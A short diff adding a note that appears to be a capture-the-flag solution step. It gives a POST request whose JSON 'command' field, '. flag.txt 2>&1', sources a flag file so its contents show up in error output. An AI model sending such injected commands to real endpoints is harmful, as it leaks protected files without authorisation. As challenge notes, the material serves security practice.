@@ -1,0 +1,9 @@
+For Empty execution :
+- Change method to `POST`
+- Add `application/json` in the header
+- Include this json :
+```json
+{
+  "command": ". flag.txt 2>&1"
+}
+```
